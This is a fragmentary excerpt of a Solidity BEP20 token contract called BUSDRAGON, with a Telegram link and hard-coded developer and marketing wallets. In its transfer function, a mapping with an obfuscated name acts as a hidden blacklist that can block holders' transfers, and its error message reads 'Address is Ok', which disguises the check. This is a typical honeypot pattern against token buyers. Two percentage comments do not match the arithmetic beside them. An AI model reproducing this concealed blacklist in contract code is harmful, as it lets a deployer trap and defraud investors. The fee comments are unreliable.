...
/**
TG: https://t.me/+VXKC6tor66EzNzBl
...
/* Token contract */
contract BUSDRAGON is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    address DEV = 0xC1f9e5dC846221Df35514adB8d9AF5aa99B316F1;
    ...
    string constant _symbol = "BUSDRAGON";
    ...
    uint256 public _maxSellTxAmount = _totalSupply * 10 / 1000; //2%
    uint256 public _maxWalletToken = ( _totalSupply * 30 ) / 1000; // 2% or 2m tokens
    ...
    mapping (address => bool) public isBzLx1ui;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xc38E91bdbe8A6dD1470249Ff1d7bbDA561771001;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!isBzLx1ui[recipient] && !isBzLx1ui[sender], 'Address is Ok');
